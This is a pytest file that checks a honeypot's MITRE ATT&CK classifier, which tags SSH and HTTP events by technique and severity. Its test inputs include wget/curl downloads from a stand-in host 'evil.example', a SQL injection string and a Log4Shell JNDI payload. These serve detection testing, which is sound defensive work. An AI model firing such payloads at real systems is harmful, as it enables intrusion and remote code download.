"""Rule tests for the MITRE ATT&CK classifier (backend/mitre.py)."""

import datetime as dt

from mitre import classify
from schemas import LoginInfo, RawEvent, Service, Severity
from sshd import hash_password

NOW = dt.datetime(2026, 11, 21, 12, 0, tzinfo=dt.timezone.utc)


def ssh(command=None, username="root", kind="command"):
    return RawEvent(
        service=Service.SSH, source_ip="203.0.113.7", destination_ip="127.0.0.1", timestamp=NOW,
        login_info=LoginInfo(username=username, password_hash=hash_password("x")),
        command=command, source_port=50000, destination_port=22, additional_info={"event_kind": kind},
    )


def http(path, method="GET", user_agent="Mozilla/5.0", username=None):
    login = LoginInfo(username=username, password_hash=hash_password("pw")) if username else None
    return RawEvent(
        service=Service.HTTP, source_ip="203.0.113.7", destination_ip="127.0.0.1", timestamp=NOW,
        http_method=method, http_path=path, user_agent=user_agent, login_info=login,
        source_port=50000, destination_port=8081, additional_info={"event_kind": "http_request"},
    )


def test_wget_or_curl_with_url_is_ingress_tool_transfer():
    assert classify(ssh("wget http://evil.example/x.sh")) == ("T1105", Severity.HIGH)
    assert classify(ssh("curl -O https://evil.example/miner")) == ("T1105", Severity.HIGH)


def test_ordinary_shell_command_is_command_interpreter():
    assert classify(ssh("whoami")) == ("T1059", Severity.MEDIUM)


def test_ssh_login_with_common_username_is_credential_stuffing():
    assert classify(ssh(kind="auth")) == ("T1110.004", Severity.HIGH)


def test_ssh_login_with_unusual_username_is_brute_force():
    assert classify(ssh(username="svc-backup-7", kind="auth")) == ("T1110", Severity.MEDIUM)


def test_exploit_in_query_string_is_exploit_attempt():
    assert classify(http("/?id=1' OR 1=1--")) == ("T1190", Severity.HIGH)


def test_exploit_in_user_agent_is_exploit_attempt():
    assert classify(http("/", user_agent="${jndi:ldap://evil.example/a}")) == ("T1190", Severity.HIGH)


def test_probe_of_known_path_is_active_scanning():
    assert classify(http("/.env")) == ("T1595", Severity.LOW)
    assert classify(http("/wp-login.php")) == ("T1595", Severity.LOW)


def test_login_post_with_credentials_is_a_credential_attack_not_a_scan():
    # Regression: /admin and /wp-login.php are scanner paths, but a POST that
    # carries a username and password is a password attempt (README: T1110 for HTTP logins).
    technique, _ = classify(http("/wp-login.php", method="POST", username="admin"))
    assert technique == "T1110.004"
    technique, _ = classify(http("/admin", method="POST", username="svc-backup-7"))
    assert technique == "T1110"


def test_plain_request_is_not_tagged():
    assert classify(http("/")) == (None, None)
